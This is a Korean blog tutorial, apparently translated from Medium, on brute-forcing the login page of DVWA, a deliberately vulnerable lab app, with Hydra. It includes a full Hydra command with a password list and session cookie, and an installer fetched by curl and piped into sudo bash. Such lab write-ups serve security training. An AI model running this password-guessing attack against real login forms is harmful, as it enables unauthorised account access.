---
title: "Hydra로 DVWA에 브루트 포스 공격하는 방법"
description: ""
coverImage: "/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_0.png"
date: 2024-06-30 18:51
ogImage: 
  url: /assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_0.png
tag: Tech
originalTitle: "Brute Force Attack DVWA with Hydra"
link: "https://medium.com/@andres.cabeza/brute-force-attack-dvwa-with-hydra-38a6b0dacca3"
---


안녕하세요! 오늘은 DVWA 브루트 포스 랩을 해킹하는 간단한 명령어를 두 가지 도구를 사용하여 소개하려고 해요.

참고: 이것은 교육적인 자습서 입니다. 본 자습서를 남용할 시에 발생하는 어떠한 문제에 대해서도 책임지지 않습니다.

# 준비물

본 자습서에서는 Ubuntu 머신을 사용하지만 Kali Linux도 사용할 수 있어요. 먼저 필요한 도구들을 설치해 봅시다.

<div class="content-ad"></div>

# 단계 1: DVWA 설치 및 구성

시작하려면 DVWA 프로젝트를 구성해야 합니다. 깃허브 저장소를 복제하고 Apache 서버를 PHP로 설정할 수 있습니다. 또는 다음 컨테이너를 사용하여 Docker를 통해 DVWA를 설치할 수 있습니다: https://hub.docker.com/r/vulnerables/web-dvwa

```js
sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
```

![이미지](/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_0.png)

<div class="content-ad"></div>

# 단계 2: 하이드라 설치

이제 비밀번호 크래킹을 위한 하이드라 도구를 설치해야 합니다. Kali Linux를 사용 중이더라도 설정이 필요할 수 있습니다:

```js
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
hydra
```

![이미지](/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_1.png)

<div class="content-ad"></div>

# 단계 3: 비밀번호 사전 준비하기

비밀번호 사전이 필요합니다. Kali Linux를 사용하고 있다면 crunch 도구를 사용하여 비밀번호 사전을 생성하거나 리눅스 머신에 설치할 수 있습니다. 이 튜토리얼에서는 Daniel Miessler 저장소에서 가장 많이 사용되는 100k개의 비밀번호 목록을 사용합니다.

# 단계 4: 대상 식별하기

대상 페이지를 검토하여 비밀번호 필드의 이름과 양식 제출 방법(GET인 경우)을 식별하세요.

<div class="content-ad"></div>

<img src="/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_2.png" />

<img src="/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_3.png" />

<img src="/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_4.png" />

# 단계 5: 실패 메시지 가져오기

<div class="content-ad"></div>

로그인에 실패한 경우에 나타나는 메시지를 확인해주세요. 예를 들어, "사용자 이름 또는 비밀번호가 올바르지 않습니다."와 같이 표시됩니다.

## 단계 6: 세션 ID 획득

리디렉션을 피하기 위해 세션 ID를 획득합니다. 브라우저에 따라 프록시를 사용하는 등 여러 방법으로 세션 ID를 가져올 수 있습니다.

## 공격 실행

<div class="content-ad"></div>

Hydra를 사용한 브루트 포스 공격의 주요 명령어는 다음과 같아요:

```js
hydra -L users.txt -P 100k-most-used-passwords-NCSC.txt localhost http-get-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=medium; PHPSESSID=sessionID:Username and/or password incorrect." -V
```

이 명령어를 설명해볼게요

- -L: 크랙할 사용자 목록
- -P: 비밀번호 사전
- -V: 상세 모드
- localhost: 공격할 주소
- http-get-form: GET 메서드 사용
- /DVWA/vulnerabilities/brute/: 경로
- 마지막으로 사용자 이름과 비밀번호 변수를 전달하여 시도해봐요.

<div class="content-ad"></div>

마지막으로, 우리가 얻은 결과는 다음과 같습니다

![Image 1](/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_5.png)

![Image 2](/assets/img/2024-06-30-BruteForceAttackDVWAwithHydra_6.png)

이 내용을 통해 Hydra를 사용하여 DVWA에 대한 브루트 포스 공격을 수행하는 방법을 안내해 드렸습니다. 이 지식을 책임있게 활용해 주세요.

<div class="content-ad"></div>

친절한 답변 감사합니다! 이 튜토리얼이 도움이 되었으면 좋겠어요. 이 도구들을 책임있게 사용해주세요. 🛡️💻

다음에 또 만나요! 🚀😊